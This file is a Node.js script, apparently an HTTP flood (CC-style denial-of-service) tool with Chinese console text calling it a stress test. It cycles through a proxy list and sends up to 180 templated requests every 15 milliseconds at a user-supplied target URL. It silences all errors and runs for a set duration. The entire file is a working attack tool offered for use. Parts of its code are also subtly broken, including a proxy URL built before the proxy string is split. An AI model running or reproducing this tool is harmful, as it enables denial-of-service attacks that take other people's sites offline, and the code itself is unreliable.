process.on('uncaughtException', function() {});
process.on('unhandledRejection', function() {});
const { HttpsProxyAgent } = require('https-proxy-agent');
const net = require('net');
const fs = require('fs');
const url = require('url');
var path = require("path");
const axios = require('axios');
const execSync = require('child_process').execSync;
try {
    var colors = require('colors');
} catch (err) {
    console.log('\x1b[36mInstalling\x1b[37m the requirements');
    execSync('npm install colors');
    console.log('Done.');
    process.exit();
}
var fileName = __filename;
var file = path.basename(fileName);
try {
    var proxies = fs.readFileSync(process.argv[3], 'utf-8').toString().replace(/\r/g, '').split('\n');
    var data = fs.readFileSync(process.argv[5], 'utf-8').toString();
} catch (err) {
    if (err.code !== 'ENOENT') throw err;
    console.log('\x1b[31m Error\x1b[37m: Proxy list not found.');
    console.log("\x1b[36m usage\x1b[37m: node " + file + " <Target> <proxies> <duration>");
    process.exit();
}

var target = process.argv[2];

var number = process.argv[6];
console.log(target);
var parsed = url.parse(target,true); 
setTimeout(() => {
    process.exit(1);
}, process.argv[4] * 1000);

 
setInterval(function() {
    try {
        var proxy = proxies[Math.floor(Math.random() * proxies.length)];
        const proxyUrl = `http://${proxy[0]}:${proxy[1]}`;
        proxy = proxy.split(':');
        const proxyAgent = new HttpsProxyAgent(proxyUrl);
        // 构造 Axios 实例，并设置代理
        const axiosInstance = axios.create({
            timeout:130000,
            httpsAgent: proxyAgent
        });

        if (!number || number <=0) {
            number = 180;
        }

        for (let j = 0; j < number; j++) {
        console.log(number)

        var options = JSON.parse(data)
        options.url = process.argv[2]
        // console.log(data)
        //  console.log(options)
        axiosInstance.request(options).then(function (response) {
        console.log(response.data);
        }).catch(function (error) {
        // console.error(error);
        });
        
        }
    } catch (error) {
        console.log(error);
    }

 
}, 15);

if (!process.argv[4]) {
    console.log("\x1b[31m Error\x1b[37m: provide time duration");
    console.log("\x1b[36m usage\x1b[37m: node " + file + " <Target> <proxies> <duration>");
    process.exit();
}

if (isNaN(process.argv[4])) {
    console.log("\x1b[31m Error\x1b[37m: enter valid time duration");
    console.log("\x1b[36m usage\x1b[37m: node " + file + " <Target> <proxies> <duration>");
    process.exit();
}

if (!process.argv[2] !== !process.argv[2].startsWith('http://') && !process.argv[2].startsWith('https://')) {
    console.log("\x1b[31m Error\x1b[37m: enter valid target");
    console.log("\x1b[36m usage\x1b[37m: node " + file + " <Target> <proxies> <duration>");
    process.exit();
}

console.log("脚本提交成功-SCDN-CC".rainbow);
console.log
("\x1b[36m目标\x1b[37m  %s | " + "\x1b[35m" + parsed.host + "\x1b[37m", process.argv[2]);
console.log("目标提交成功,本次测压时间为 %s 秒", process.argv[4]);